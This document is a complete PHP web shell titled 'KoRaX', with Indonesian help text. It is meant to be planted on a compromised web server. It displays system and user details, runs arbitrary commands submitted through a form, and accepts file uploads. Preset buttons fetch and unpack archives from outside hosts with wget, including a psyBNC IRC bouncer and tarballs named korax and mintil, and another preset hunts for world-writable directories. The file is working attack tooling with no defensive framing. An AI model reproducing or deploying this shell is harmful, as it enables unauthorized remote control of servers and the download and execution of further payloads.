<title>KoRaX</title><div align="left">
  <p align="center"><br>
<font face="courier new" size="4" color="777777"><b><center><h1><marquee></marquee></h1></center></b></font></body></div>
<style>body{font-family:trebuchet ms;font-size:16px;color:yellow;background-color:black}hr{width:100%;height:2px;}</style>
<p align="center"><b><font size="3" face="Century Gothic"></font></b></p>
<p align="center"><b><font size="5" face="Century Gothic"></font></b></p>
<p align="center">&nbsp;</p>

<div align="left"><b><?php
closelog( );
$user = get_current_user( );
$login = posix_getuid( );
$euid = posix_geteuid( );
$ver = phpversion( );
$up = `uptime`;
$gid = posix_getgid( );
if ($chdir == "") $chdir = getcwd( );
if(!$whoami)$whoami=exec("whoami");
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php
$uname = posix_uname( );
while (list($info, $value) = each ($uname)) {
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b><span style="font-size: 9pt"><?= $info ?>
<span style="font-size: 9pt">:</b> <?= $value ?></span></DIV></TD>
</TR>
<?php
}
?>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">User Info:</b> uid=<?= $login ?>(<?= $whoami?>) euid=<?= $euid ?>(<?= $whoami?>) gid=<?= $gid ?>(<?= $whoami?>)</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Current Path:</b> <?= $chdir ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Write Directory:</b> <? if(@is_writable($chdir)){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR>  
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Services:</b> <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Server Address:</b> <?= "$SERVER_ADDR $SERVER_NAME"; ?>
</span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">Script Current User:</b> <?= $user ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">UP Time:</b> <?= $up ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; font-size: 10px;"><b>
<span style="font-size: 9pt">PHP Version:</b> <?= $ver ?></span></DIV></TD>
</TR>
<TR>
<TD align="left"><DIV STYLE="font-family: verdana; color: green ; font-size: 10px;"><b>
<span style="font-size: 9pt">Wget:</b> <? if(exec("wget --help")){ echo "Yes"; }else{ echo "No"; } ?>
</span></DIV></TD>
</TR> 
</TABLE>
</b></font>
<?php

set_magic_quotes_runtime(0);

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

if( $_POST['_act'] == "777" ) {
    $currentCMD = "find / -perm 777 -type d";
}

if( $_POST['_act'] == "PSY" ) {
    $currentCMD = "wget anang.co.uk/psybnc.tar.gz;tar -zxvf psybnc.tar.gz;rm -rf psybnc.tar.gz;cd /tmp/..../.psy;./config $currentCMD ;./fuck;./run";
}

if( $_POST['_act'] == "TA" ) {
    $currentCMD = "wget http://tulungagungan.zoomshare.com/files/korax.tar.gz; tar -zxvf korax.tar.gz;";
}

if( $_POST['_act'] == "MI" ) {
    $currentCMD = "wget http://tulungagungan.zoomshare.com/files/mintil.tar.gz; tar -zxvf mintil.tar.gz";
}

if( $_POST['_act'] == "pid" ) {
    $currentCMD = "ps -x";
}

if( $_POST['_act'] == "LIST IP" ) {
    $currentCMD = "/sbin/ifconfig | grep inet";
}

if( $_POST['_act'] == "[W]Dir" ) {
    $currentCMD = "find . -type d -perm -2 -ls";
}

if( $_POST['_act'] == "List Files" ) {
    $currentCMD = "ls -la";
}
print "<form method=post enctype=\"multipart/form-data\"><hr><table>";

print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"EXECT\"><input type=submit name=_act value=\"PSY\">";

print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List Files\"><input type=submit name=_act value=\"777\"><input type=submit name=_act value=\"pid\"></td></tr>";

print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "<tr><td><input type=submit name=_act value=\"TA\"><input type=submit name=_act value=\"MI\"><input type=submit name=_act value=\"LIST IP\"><input type=submit name=_act value=\"PORTS\"></td></tr>";

print "</table></form><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "HELP" ) {
print "<table>";
print "<tr><td>Command EXECT = Untuk menjalankan perintah.</td></tr>";
print "<tr><td>Command PROXY = Masukkan port proxy di kolom EXECT.</td></tr>";
print "<tr><td>Command BUAT PSY = Masukkan port di kolom EXECT.</td></tr>";
print "<tr><td>Command BUAT SHELL = Menginstall Shell .</td></tr>";
print "<tr><td>Command LIST IP = Untuk mengetahui IP Shell.</td></tr>";
print "<tr><td>Command LIST = Untuk melihat isi direktori.</td></tr>";
print "<tr><td>Command [W]Dir = Untuk melihat direktori WRITE.</td></tr>";
print "<tr><td>Command 777 = Untuk melihat port yg terbuka.</td></tr>";
print "<tr><td>Command pid = Untuk melihat semua proses.</td></tr>";
print "</table></form><hr><hr>";
}

if( $_POST['_act'] == "Upload!" ) {
if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
print "<center><b>DancoX ErroR!</b></center>";
} else {
print "<center><pre>";
system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
print "</pre><b>Upload Berhasil CoY!</b></center>";
}    
} else {
print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
$currentCMD = "cd ".$currentWD.";".$currentCMD;
system("$currentCMD 1> /tmp/ShirohigEShell 2>&1; cat /tmp/ShirohigEShell; rm -rf /tmp/ShirohigEShell");
print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><center><b>PaTh GuLiPatH</b></center>";
}

exit;

?></body></font></font></b></font>